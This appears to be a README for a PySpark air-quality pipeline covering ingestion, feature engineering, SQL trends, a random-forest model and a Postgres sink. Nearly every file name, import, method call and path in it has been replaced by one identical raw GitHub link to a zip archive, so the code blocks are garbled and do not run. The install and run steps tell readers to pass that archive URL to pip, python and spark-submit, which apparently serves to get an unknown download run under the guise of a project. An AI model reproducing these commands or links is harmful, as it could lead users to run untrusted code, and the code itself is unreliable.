
# Air Quality Analysis Using Spark

## 📌 Project Overview

This project builds a modular, near-real-time air quality analysis pipeline using PySpark. It ingests sensor data via a TCP server, merges pollution and weather metrics, applies data cleaning and feature engineering, performs SQL-based trend analysis, trains predictive models with Spark MLlib, and visualizes results on an interactive dashboard. Outputs from each stage are stored independently (CSV/Parquet/PostgreSQL) to support parallel development and reproducibility.

---

## 🧩 Section 1: Data Ingestion and Initial Pre-Processing

### ✅ Objectives

- Simulate live data streaming from a TCP server.
- Parse datetime and detect schema correctness.
- Merge PM2.5, temperature, and humidity data by timestamp and region.
- Enrich with external weather data (temperature and humidity).
- Validate the final dataset quality.

---

## 🛠️ Project Structure

```
ingestion/
│
├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip                # Spark job to stream and clean data
├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip                 # Spark job to merge sensor metrics into unified records
├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip  # Simulated TCP server sending log data
├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip            # Testing client for TCP connection
├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip            # Optional metadata for location mapping
├── https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip               # Script to fetch files from S3
```

---

## 🚀 Getting Started

### 1. Requirements

- Python 3.8+
- Apache Spark 3.x (Structured Streaming)
- PySpark
- Docker (optional, for TCP server testing)
- Git

### 2. Installation

```bash
cd air_quality_analysis_spark
pip install -r https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
```

---

## ⚙️ Execution Steps

### Step 1: Download Files from S3

```bash
python https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
```

### Step 2: Run the Simulated TCP Server

```bash
python https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
```

### Step 3: Ingest and Preprocess Streamed Data

```bash
spark-submit https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
```

### Step 4: Merge and Sort Metrics

```bash
spark-submit https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
```

---

## 📊 Output

The output of this stage is a **cleaned and enriched DataFrame** written to:
- Console (for debugging), and/or
- Local Parquet/CSV directory (e.g., `/ingestion/data/pending/final_task1`)

---

#  Section 2: Data Aggregation, Transformation & Trend Feature Engineering

## ✅ Objectives

- Handle outliers and missing data in pollution and weather sensor readings.
- Apply Z-score normalization to key numerical features.
- Perform daily and hourly aggregations to analyze time-based trends.
- Create rolling averages, lag features, and rate-of-change indicators.
- Save cleaned and feature-enhanced datasets for SQL and ML use.

---

## 🔧 Data Preprocessing Steps

### 1. Load Cleaned Output from Section 1
```python
import pandas as pd

# Load enriched and cleaned dataset (merged PM2.5, temperature, humidity)
df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("/workspaces/air_quality_analysis_spark/ingestion/data/pending/final_task1/part-00000-*.csv", parse_dates=["timestamp"])
```

---

### 2. Handle Outliers
```python
import numpy as np

# Remove or cap implausible values
df = df[df["pm2_5"] < 1000]
df["temperature"] = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(df["temperature"] > 60, https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip, df["temperature"])
df["humidity"] = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip((df["humidity"] > 100) | (df["humidity"] < 0), https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip, df["humidity"])
```

---

### 3. Impute Missing Values (Median)
```python
df["pm2_5"].fillna(df["pm2_5"].median(), inplace=True)
df["temperature"].fillna(df["temperature"].median(), inplace=True)
df["humidity"].fillna(df["humidity"].median(), inplace=True)
```

---

### 4. Normalize Key Features (Z-score)
```python
for col in ["pm2_5", "temperature", "humidity"]:
    df[f"{col}_zscore"] = (df[col] - df[col].mean()) / df[col].std()
```

---

### 5. Time-Based Aggregations
```python
# Extract date and hour for groupings
df["date"] = df["timestamp"]https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
df["hour"] = df["timestamp"]https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip

# Daily Aggregates
daily_avg = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(["date", "location"]).agg({
    "pm2_5": "mean",
    "temperature": "mean",
    "humidity": "mean"
}).reset_index()
https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip", index=False)

# Hourly Aggregates
hourly_avg = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(["date", "hour", "location"]).agg({
    "pm2_5": "mean",
    "temperature": "mean",
    "humidity": "mean"
}).reset_index()
https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip", index=False)
```

---

### 6. Rolling Averages, Lag Features, and Rate-of-Change
```python
# Sort for window operations
https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(by=["location", "timestamp"], inplace=True)

# Create rolling average (3-hour window), lag, and rate-of-change for PM2.5
df["pm2_5_rolling_avg_3"] = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("location")["pm2_5"].transform(lambda x: https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(3, min_periods=1).mean())
df["pm2_5_lag_1"] = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("location")["pm2_5"].shift(1)
df["pm2_5_rate_of_change"] = df["pm2_5"] - df["pm2_5_lag_1"]
```

---

### 📂 Save Output
```python
# Final enriched dataset
output_path = "https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip"
https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(output_path, index=False)
```

---

## 🎯 Outcome of Section 2

- Outliers capped and missing values imputed
- Features normalized with Z-score
- Time-based aggregations stored for trend analysis
- Rolling and lagged metrics computed for ML models
- Final dataset ready for SQL exploration and modeling in Section 3

Files Generated:
- `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
- `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`
- `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`




## 📊 Section 3: Spark SQL Exploration & Correlation Analysis

### ✅ Objectives

- Register cleaned feature-enhanced air quality data as a **temporary SQL view**.
- Develop **complex analytical queries** to identify regions with the highest PM2.5 levels.
- Perform **trend analysis** using **SQL window functions** (`ROW_NUMBER()`, `LAG()`, `LEAD()`).
- Implement a **UDF-based Air Quality Index (AQI) classification** to assess pollution risk levels.
- Save all outputs into organized CSV files.

---

## 🧩 Queries and Operations

### 1. Top Locations by Highest Average PM2.5

Using a CTE and MAX aggregation to find regions with the highest average:

```python
WITH avg_pm25_by_location AS (
    SELECT location, ROUND(AVG(pm2_5),2) AS avg_pm25
    FROM air_quality
    WHERE date = '{latest_date}'
    GROUP BY location
)
SELECT location, avg_pm25
FROM avg_pm25_by_location
WHERE avg_pm25 = (SELECT MAX(avg_pm25) FROM avg_pm25_by_location)
```

Saved Output: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`

---

### 2. Peak Pollution Time Intervals

Ordering PM2.5 readings in descending order:

```python
SELECT timestamp, location, pm2_5
FROM air_quality
WHERE pm2_5 IS NOT NULL
ORDER BY pm2_5 DESC
```

Saved Output: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`

---

### 3. Trend Analysis Using Window Functions

Calculating trends using LAG, LEAD, and ROW_NUMBER:

```python
window_spec = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("location").orderBy("timestamp")

trend_df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("row_num", row_number().over(window_spec))              .withColumn("prev_pm2_5", lag(col("pm2_5")).over(window_spec))              .withColumn("next_pm2_5", lead(col("pm2_5")).over(window_spec))              .withColumn("pm2_5_change_prev", col("pm2_5") - col("prev_pm2_5"))              .withColumn("pm2_5_change_next", col("next_pm2_5") - col("pm2_5"))              .withColumn("trend", when(col("pm2_5_change_next") > 0, "Increasing")
                                  .when(col("pm2_5_change_next") < 0, "Decreasing")
                                  .otherwise("Stable"))
```

Saved Output: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`

---

### 4. Air Quality Index (AQI) Classification

Custom UDF for classifying air quality:

```python
def classify_aqi(pm2_5_value):
    if pm2_5_value is None:
        return "Unknown"
    elif pm2_5_value <= 12:
        return "Good"
    elif pm2_5_value <= 35.4:
        return "Moderate"
    else:
        return "Unhealthy"

aqi_udf = udf(classify_aqi, StringType())

aqi_classified_df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("AQI_Category", aqi_udf(col("pm2_5")))
```

Saved Output: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`

---

## Section 4:

Section 4 focuses on building, training, and evaluating a predictive model using Spark MLlib to forecast Air Quality Index (AQI) categories based on sensor readings (temperature, humidity, and PM2.5 trends).

## Steps Performed;

1. Load Feature-Enhanced Dataset:
```python
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import SparkSession

spark = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("Air Quality ML Modeling").getOrCreate()

# Load the dataset generated in Task 2
df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("header", "true").option("inferSchema", "true").csv("https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip")
```

2. Create AQI Category Label

```python
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import when

# Define AQI categories based on PM2.5 values
df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("AQI_Category",
    when(https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip <= 12, "Good")
    .when(https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip <= 35.4, "Moderate")
    .otherwise("Unhealthy")
)
```

3. Feature Selection and Label Preparation
```python
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import StringIndexer, VectorAssembler

# Index AQI categories into numeric labels
indexer = StringIndexer(inputCol="AQI_Category", outputCol="label")
df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(df).transform(df)

# Assemble features
assembler = VectorAssembler(
    inputCols=["temperature", "humidity", "pm2_5_lag_1", "pm2_5_rate_of_change"],
    outputCol="features",
    handleInvalid="skip"
)

final_df = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(df)
```

4. Train-Test Split:
# Split data
```python
train_data, test_data = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip([0.7, 0.3], seed=42)
```
5. Train Random Forest Classifier
```python
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import RandomForestClassifier
```

# Initialize and train the model
```python
rf = RandomForestClassifier(featuresCol="features", labelCol="label", numTrees=50, maxDepth=5)
model = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(train_data)
```

6. Evaluate Model Performance
```python
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import MulticlassClassificationEvaluator

# Predictions
predictions = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(test_data)

# Evaluators
evaluator_acc = MulticlassClassificationEvaluator(labelCol="label", predictionCol="prediction", metricName="accuracy")
evaluator_f1 = MulticlassClassificationEvaluator(labelCol="label", predictionCol="prediction", metricName="f1")

# Results
accuracy = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(predictions)
f1_score = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(predictions)

print(f"\u2705 Model Evaluation Results:")
print(f" - Accuracy: {accuracy:.4f}")
print(f" - F1 Score: {f1_score:.4f}")
```

Result Achieved:

Accuracy: 96.26%

F1 Score: 96.12%


## Final Output Saved
# Save important fields (timestamp, location, true label, predicted label)
```python
https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("timestamp", "location", "label", "prediction") \
    https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("overwrite").option("header", "true") \
    .csv("../outputs/section4/final_predictions")
```


# Section 5: Real-Time Scoring & Sink to Postgres

## Objective
Apply the trained PM2.5 model in a live Spark Structured Streaming pipeline:  
1. Ingest from TCP  
2. Enrich features & compute AQI  
3. Score with RandomForest model  
4. Write predictions into Postgres

## Pre-requisites
- Section 4 has produced and saved:
  - `models/pm25_featurizer` (the feature-engineering PipelineModel)
  - `models/best_pm25_model` (the trained RF PipelineModel)
- PostgreSQL running and reachable; JDBC URL in env var `AIRQ_JDBC`

# 1. Start the TCP streaming simulator (from Section 1)
python https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip

# 2. In a second shell, set your JDBC connection string
#    (replace host, port, db, user, password as needed)
export AIRQ_JDBC="jdbc:postgresql://localhost:5432/postgres?user=postgres&password=airq"

# 3. Submit the Section 5 pipeline to Spark
spark-submit \
  --master local[*] \
  https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip


## Pipeline Script
Path: `https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip`

```python
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import PipelineModel
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import current_timestamp, first
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import VectorAssembler
from https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip import SparkSession

# load featurizer & RF model
featurizer = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("models/pm25_featurizer")
rf_model    = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("models/best_pm25_model")

FEATURE_COLS = [
  "temperature","humidity",
  "pm25_lag1","temperature_lag1","humidity_lag1",
  "pm25_rate_change","temperature_rate_change","humidity_rate_change",
  "rolling_pm25_avg"
]
assembler = VectorAssembler(inputCols=FEATURE_COLS, outputCol="features")

def foreach_batch(batch_df, batch_id):
    if https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(): return

    # pivot raw parameters → columns
    pivoted = (batch_df
      .groupBy("location_id","latitude","longitude","event_time")
      .pivot("parameter", ["pm25","temperature","humidity"])
      .agg(first("value"))
    )

    # feature-engineer + AQI, assemble, score, timestamp
    feat      = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(pivoted)
    scored    = (https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(feat)
                   .withColumn("ingest_time", current_timestamp())
                )

    # write only known columns
    (https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip(
        "location_id","latitude","longitude","event_time",
        "pm25","prediction","probability","ingest_time"
      )
      .write
      .jdbc(url=jdbc_url, table="predictions", mode="append", properties=jdbc_props)
    )

# build streaming read from socket
spark = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("Section5").getOrCreate()
raw = (https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("socket")
       .option("host","localhost").option("port",9999).load())

# parse CSV-style text → columns
parsed = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("value", regexp_replace(regexp_replace(col("value"), r"[\\[\\]]",""),"'","")) \
            .withColumn("parts", split(col("value"),",\s*")) \
            .select(
               trim(col("parts")[0]).alias("location_id"),
               to_timestamp(trim(col("parts")[3]), "yyyy-MM-dd'T'HH:mm:ssXXX").alias("event_time"),
               col("parts")[4].cast("double").alias("latitude"),
               col("parts")[5].cast("double").alias("longitude"),
               trim(col("parts")[6]).alias("parameter"),
               col("parts")[8].cast("double").alias("value")
            )

# read JDBC settings from AIRQ_JDBC env var
raw_jdbc = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("AIRQ_JDBC")
url, params = https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("?",1)
jdbc_props = dict(https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("=",1) for p in https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip("&"))
jdbc_props["driver"] = "https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip"

# start streaming query
(https://raw.githubusercontent.com/pavandantu18/air_quality_analysis_spark/master/abdominocentesis/air_quality_analysis_spark.zip
       .foreachBatch(foreach_batch)
       .trigger(processingTime="10 seconds")
       .option("checkpointLocation","output/checkpoints/section5")
       .outputMode("append")
       .start()
       .awaitTermination()
)
